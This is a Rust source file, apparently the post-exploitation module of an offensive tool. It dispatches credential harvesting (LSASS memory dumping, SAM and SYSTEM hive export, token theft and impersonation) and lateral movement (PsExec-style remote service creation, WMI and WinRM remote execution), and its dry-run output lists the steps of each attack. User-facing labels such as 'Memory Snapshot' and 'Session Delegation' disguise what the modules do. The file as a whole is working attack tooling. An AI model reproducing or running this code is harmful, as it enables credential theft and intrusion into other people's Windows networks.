pub mod creds;
pub mod lateral;

use crate::log::LogSink;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum PostExModule {
    LsassDump,
    SamDump,
    TokenTheft,
    PsExec,
    WmiExec,
    WinRmExec,
}

impl PostExModule {
    #[allow(clippy::should_implement_trait)]
    pub fn from_str(s: &str) -> Result<Self, String> {
        match s.to_lowercase().as_str() {
            "lsass" | "memdump" | "snapshot" => Ok(Self::LsassDump),
            "sam" | "registry" | "hive" => Ok(Self::SamDump),
            "token" | "delegate" | "session" => Ok(Self::TokenTheft),
            "psexec" | "service" | "svc" => Ok(Self::PsExec),
            "wmi" | "wmic" => Ok(Self::WmiExec),
            "winrm" | "winrs" => Ok(Self::WinRmExec),
            _ => Err(format!("Unknown module: '{}'. Use: lsass, sam, token, psexec, wmi, winrm", s)),
        }
    }

    pub fn name(&self) -> &'static str {
        match self {
            Self::LsassDump => "Memory Snapshot",
            Self::SamDump => "Registry Export",
            Self::TokenTheft => "Session Delegation",
            Self::PsExec => "Remote Service",
            Self::WmiExec => "Remote Execution (WMI)",
            Self::WinRmExec => "Remote Execution (WinRM)",
        }
    }

    pub fn all() -> &'static [PostExModule] {
        &[
            Self::LsassDump, Self::SamDump, Self::TokenTheft,
            Self::PsExec, Self::WmiExec, Self::WinRmExec,
        ]
    }

    pub fn is_credential(&self) -> bool {
        matches!(self, Self::LsassDump | Self::SamDump | Self::TokenTheft)
    }

    pub fn is_lateral(&self) -> bool {
        matches!(self, Self::PsExec | Self::WmiExec | Self::WinRmExec)
    }
}

pub struct PostExConfig {
    pub module: PostExModule,
    pub pid: u32,
    pub output: String,
    pub remote: String,
    pub username: String,
    pub password: String,
    pub command: String,
    pub service_name: String,
    pub payload_path: String,
}

pub struct PostExResult {
    pub module: String,
    pub description: String,
}

pub fn dry_run(module: &PostExModule, log: &LogSink) {
    log.info(format!("[DRY RUN] Post-Exploitation: {}", module.name()));
    match module {
        PostExModule::LsassDump => {
            log.step("  Steps:");
            log.detail("    1. Enable debug privilege on current process");
            log.detail("    2. Open target process with full access");
            log.detail("    3. Create output file");
            log.detail("    4. Write memory snapshot via MiniDumpWriteDump");
            log.detail("    5. Close handles");
            log.info("  Requires: elevated privileges, target PID, output path");
        }
        PostExModule::SamDump => {
            log.step("  Steps:");
            log.detail("    1. Enable debug privilege");
            log.detail("    2. Export SAM hive via reg.exe save");
            log.detail("    3. Export SYSTEM hive via reg.exe save");
            log.info("  Requires: elevated privileges, output directory");
        }
        PostExModule::TokenTheft => {
            log.step("  Steps:");
            log.detail("    1. Enable debug privilege");
            log.detail("    2. Open target process token");
            log.detail("    3. Duplicate token with impersonation level");
            log.detail("    4. Assume duplicated identity");
            log.info("  Requires: elevated privileges, target PID");
        }
        PostExModule::PsExec => {
            log.step("  Steps:");
            log.detail("    1. Connect to remote ADMIN$ share");
            log.detail("    2. Copy payload to remote system");
            log.detail("    3. Open remote service manager");
            log.detail("    4. Create and start remote service");
            log.detail("    5. Delete service entry and disconnect");
            log.info("  Requires: remote host, credentials, payload path");
        }
        PostExModule::WmiExec => {
            log.step("  Steps:");
            log.detail("    1. Build WMI command for remote process creation");
            log.detail("    2. Execute via wmic with output capture");
            log.info("  Requires: remote host, command, optional credentials");
        }
        PostExModule::WinRmExec => {
            log.step("  Steps:");
            log.detail("    1. Build WinRM command for remote execution");
            log.detail("    2. Execute via winrs with output capture");
            log.info("  Requires: remote host, command, optional credentials");
        }
    }
}

pub fn run_postex(config: &PostExConfig, log: &LogSink) -> Result<PostExResult, String> {
    log.info(format!("Post-Exploitation: {}", config.module.name()));

    let result = match config.module {
        PostExModule::LsassDump => {
            if config.pid == 0 { return Err("Target PID required for memory snapshot".into()); }
            if config.output.is_empty() { return Err("Output path required".into()); }
            let r = creds::lsass_dump(config.pid, &config.output, log)?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::SamDump => {
            if config.output.is_empty() { return Err("Output directory required".into()); }
            let r = creds::sam_dump(&config.output, log)?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::TokenTheft => {
            if config.pid == 0 { return Err("Target PID required for session delegation".into()); }
            let r = creds::token_theft(config.pid, log)?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::PsExec => {
            if config.remote.is_empty() { return Err("Remote host required".into()); }
            if config.payload_path.is_empty() { return Err("Payload path required".into()); }
            let svc = if config.service_name.is_empty() { "BadangSvc" } else { &config.service_name };
            let r = lateral::psexec(
                &config.remote, svc, &config.payload_path,
                &config.username, &config.password, log,
            )?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::WmiExec => {
            if config.remote.is_empty() { return Err("Remote host required".into()); }
            if config.command.is_empty() { return Err("Command required".into()); }
            let r = lateral::wmi_exec(
                &config.remote, &config.command,
                &config.username, &config.password, log,
            )?;
            PostExResult { module: r.module, description: r.description }
        }
        PostExModule::WinRmExec => {
            if config.remote.is_empty() { return Err("Remote host required".into()); }
            if config.command.is_empty() { return Err("Command required".into()); }
            let r = lateral::winrm_exec(
                &config.remote, &config.command,
                &config.username, &config.password, log,
            )?;
            PostExResult { module: r.module, description: r.description }
        }
    };

    log.info(format!("  Result: {}", result.description));
    Ok(result)
}

pub fn print_info(log: &LogSink) {
    log.info("Post-Exploitation Modules:");
    log.step("  Credential Harvesting:");
    for m in PostExModule::all().iter().filter(|m| m.is_credential()) {
        log.detail(format!("    {} ({})", m.name(), match m {
            PostExModule::LsassDump => "lsass",
            PostExModule::SamDump => "sam",
            PostExModule::TokenTheft => "token",
            _ => "",
        }));
    }
    log.step("  Lateral Movement:");
    for m in PostExModule::all().iter().filter(|m| m.is_lateral()) {
        log.detail(format!("    {} ({})", m.name(), match m {
            PostExModule::PsExec => "psexec",
            PostExModule::WmiExec => "wmi",
            PostExModule::WinRmExec => "winrm",
            _ => "",
        }));
    }
}
